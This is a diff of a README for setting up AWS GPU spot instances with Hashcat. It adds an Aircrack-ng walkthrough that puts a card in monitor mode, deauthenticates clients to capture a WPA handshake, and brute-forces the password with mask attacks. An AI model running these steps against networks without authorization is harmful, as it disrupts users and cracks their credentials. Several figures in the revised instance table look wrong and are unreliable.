@@ -14,9 +14,13 @@ We can use instances of type P3 for example, which contains the following config
 
 Name | GPUs | GPU Mem | vCPU | Mem (GiB) | Cost/hour 
 -----|------|---------|------|-----------|----------
-p3.2xlarge | 1 | 12 | 4 | 61 | $ 3.06 
-p3.8xlarge | 8 | 96 | 32 | 488 | $ 12.24
-p3.16xlarge | 16 | 192 | 64 | 732 | $ 24.48
+p3.2xlarge | 1 | 16 | 4 | 61 | $ 3.06 
+p3.8xlarge | 8 | 64 | 32 | 244 | $ 12.24
+p3.16xlarge | 8 | 128 | 64 | 488 | $ 24.48
+p3dn.24xlarge | 8 | 256 | 96 | 768 | $ 31.218
+p4d.24xlarge | 8 | not specified | 96 | 1152 | $ 32.77
+
+You can be able to save up to 70% by using spot instance.
 
 ## Prerequisites
 
@@ -32,8 +36,8 @@ With the pre requisites fulfilled hands down.
 
 ### Uploading Instance
 
-1. Select the AMI Ubuntu Server 16.04 LTS (HVM), SDD Volume type
-1. Choose the type, in this example I'll use **p3.8xlarge**
+1. Select the AMI Debian 10
+1. Choose the type, in this example I'll use **p3.2xlarge**
 1. Configure the details, storage, security group, key pair, etc.
 1. After creating the instance make the connection via SSH
 
@@ -41,28 +45,28 @@ At this point we will do the initial configuration.
 
 ### Configuration
 
-Update apt
+Update and upgrade apt
 
 ```
-sudo apt-get update -yq
+sudo apt update && sudo apt upgrade -y
 ```
 
 Install the packages
 
 ```
-sudo apt-get install -yq build-essential linux-headers -$(uname -r) unzip p7zip-full linux-image-extra-virtual python3-pip
+sudo apt install -y --ignore-missing build-essential tmux htop vim jq unzip lsof git p7zip-full
 ```
 
-And the pack **psutill** with **pip**
+Set the correct timezone
 
 ```
-pip3 install psutil
+ln -sf /usr/share/zoneinfo/America/Sao_Paulo /etc/localtime
 ```
 
 Create the file **blacklist-nouveau.conf**
 
 ```
-sudo touch /etc/modprobe.d/blacklist-nouveau.conf
+sudo vim /etc/modprobe.d/blacklist-nouveau.conf
 ```
 
 Enter the following lines
@@ -74,10 +78,11 @@ options nouveau modeset = 0
 alias nouveau off
 alias lbm-nouveau off
 ```
+
 Create the file **nouveau-kms.conf**
 
 ```
-sudo touch /etc/modprobe.d/nouveau-kms.conf
+sudo vim /etc/modprobe.d/nouveau-kms.conf
 ```
 Enter the following line
 
@@ -85,39 +90,120 @@ Enter the following line
 options nouveau modeset = 0
 ```
 
-And then upgrade
+And then upgrade initramfs
 
 ```
 sudo update-initramfs -u
 ```
 
-Download NVIDIA
+At this point reboot your server to continue.
 
+Install linux headers
 ```
-cd /tmp
-wget http://us.download.nvidia.com/tesla/410.104/NVIDIA-Linux-x86_64-410.104.run
-```
-
-Do the installation
-
-```
-sudo /bin/bash NVIDIA-Linux-x86_64-410.104.run --ui = none --no-questions --silent -X
+sudo apt install -y linux-headers-`uname -r`
 ```
 
-Download HashCat
+Download NVIDIA and install
 
 ```
-git clone https://github.com/hashcat/hashcat.git
+cd /tmp/
+wget https://us.download.nvidia.com/tesla/470.57.02/NVIDIA-Linux-x86_64-470.57.02.run
+sudo /bin/bash NVIDIA-Linux-x86_64-470.57.02.run --ui=none --no-questions --silent -X
+
 ```
 
-And then do the installation
+Download HashCat and install
 
 ```
-sudo make
-sudo make install
+cd /tmp/
+wget https://hashcat.net/files/hashcat-6.2.4.7z >/dev/null 2>&1
+7za x hashcat-6.2.4.7z >/dev/null 2>&1
+mv hashcat-6.2.4 /home/admin/
+ln -s /home/admin/hashcat-6.2.4/hashcat.bin /usr/local/bin/hashcat
 ```
 
-At this point you can put your **.hccapx** files on the server, if you have captured the handshake through **Aircrack-ng** you can convert the file **.cap** to **.hccapx** without much trouble, a very simple alternative is to use a tool called [cap2hccap](https://hashcat.net/cap2hccap/) from HashCat itself.
+At this point you can put your **.hc22000** files on the server, if you have captured the handshake through **Aircrack-ng** you can convert the file **.cap** to **.hc22000** without much trouble, a very simple alternative is to use a tool called [cap2hashcat](https://hashcat.net/cap2hashcat/) from HashCat itself.
 
 Now just launch the command and wait for the password to be discovered, for more information on usage consult HashCat [Documentation](https://hashcat.net/wiki/).
 
+**Getting the Handshake using Aircrack-ng**
+
+Install aircrack-ng
+```
+sudo apt install aircrack-ng
+```
+
+Put the interface into monitoring mode
+```
+sudo airmon-ng start wlan0
+```
+
+If the interface is busy
+```
+sudo airmon-ng check kill
+```
+
+check candidates
+```
+sudo airodump-ng wlan0mon
+```
+
+Once chosen stop it and start capture
+```
+sudo airodump-ng -c CHANNEL --bssid MAC -w /tmp/wificapfile wlan0mon
+```
+
+To make faster the capture, you can force the reauthentication
+```
+sudo aireplay-ng -0 2 -a MAC -c MAC wlan0mon
+```
+
+Little explanation
+```
+-0 2: number of requests
+-a: access point MAC address
+-c: client MAC address
+```
+
+You will see in the top right corner when the handshake is captured, then stop the capture and convert using **cap2hashcat** tool.
+
+**Terraform project**
+
+You must have the following packages
+```
+aws-cli
+terraform
+```
+
+Configure the aws credentials
+```
+aws configure
+```
+
+Init Terraform
+
+```
+terraform init
+```
+
+Apply
+```
+terraform apply
+```
+
+At this point all the environment and spot instance machine will be created, and will be automatically launched the **initial-script.sh** located in scripts folder, once finished reboot the server and run **hashcat.sh** to install nvidia drivers and hashcat.
+
+**How to use Hashcat**
+
+There is some example bellow, you can consult the oficial documentation as well
+
+Send the file to the server
+```
+scp -i aws-hcat-prod.pem wificapfile.hc22000 admin@<ip address>:/home/admin/
+```
+
+Hashcat brute force examples
+```
+hashcat -m 22000 wificapfile.hc22000 -a 3 ?d?d?d?d?d?d?d?d
+hashcat wificapfile.hc22000 -m 22000 -a 3 ?H?H?H?HAA10
+```
